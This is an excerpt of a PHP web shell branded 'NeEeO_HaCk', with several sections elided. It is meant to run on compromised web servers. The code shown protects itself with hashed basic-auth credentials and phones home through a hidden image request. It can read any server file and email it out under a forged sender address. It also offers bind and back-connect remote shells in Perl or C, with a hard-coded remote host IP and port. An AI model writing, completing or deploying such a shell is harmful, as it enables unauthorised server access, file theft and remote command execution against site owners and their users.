...
$language='eng';
$auth = 0;
$name='cb59608fced567a14b13a6e5c5c8a1d2';
$pass='cb59608fced567a14b13a6e5c5c8a1d2';
/******************************************************************************************************/
error_reporting(0);
...
if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass)
   {
   header('WWW-Authenticate: Basic realm="NeEeO_HaCk"');
   header('HTTP/1.0 401 Unauthorized');
   exit("<b><a href=id=nobody.com>NeEeO_HaCk</a> : Access Denied</b>");
   }
}
$head = '<!--                  -->
<html>
<head>
<title>power by NeEeO_HaCk</title>
...
@print "<img src=\"http://127.0.0.1/NeEeO_HaCk/version.php?img=1&version=".$current_version."\" border=0 height=0 width=0>";
@readfile ("http://127.0.0.1/NeEeO_HaCk/version.php?version=".$current_version."");}}
...
<font face=Webdings size=6><b>!</b></font><b>'.ws(2).'NeEeO_HaCk '.$version.'</b>
...
if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']=="mail_file" && !empty($_POST['loc_file']))
 ...
 if(!$file=@fopen($_POST['loc_file'],"r")) { echo re($_POST['loc_file']); $_POST['cmd']=""; }
 else
  {
    ...
    if(empty($_POST['subj'])) { $_POST['subj'] = 'file from NeEeO_HaCk'; }
...
echo sr(25,"<b>".$lang[$language.'_text106'].$arrow."</b>",in('text','from',45,(!empty($_POST['from'])?($_POST['from']):("billgates@microsoft.com"))));
echo sr(25,"<b>".$lang[$language.'_text107'].$arrow."</b>",in('text','subj',45,(!empty($_POST['subj'])?($_POST['subj']):("file from NeEeO_HaCk"))));
echo sr(25,"<b>".$lang[$language.'_text18'].$arrow."</b>",in('text','loc_file',45,$dir));
...
echo sr(40,"<b>".$lang[$language.'_text14'].$arrow."</b>",in('text','port',15,'3303'));
echo sr(40,"<b>".$lang[$language.'_text20'].$arrow."</b>","<select size=\"1\" name=\"use\"><option value=\"Perl\">Perl</option><option value=\"C\">C</option></select>".in('hidden','dir',0,$dir));
...
echo sr(40,"<b>".$lang[$language.'_text23'].$arrow."</b>",in('text','local_port',15,'3303'));
echo sr(40,"<b>".$lang[$language.'_text24'].$arrow."</b>",in('text','remote_host',15,'72.249.74.18'));
...
echo '</table>'.$table_up3."</div></div><div align=center id='n'><font face=Verdana size=-2><b>[ NeEeO_HaCk - by id-nobody.com. | <a 
href=http://id-nobody.com</a> | version ".$version." ]</b></font></div></td></tr></table>".$f;
?>
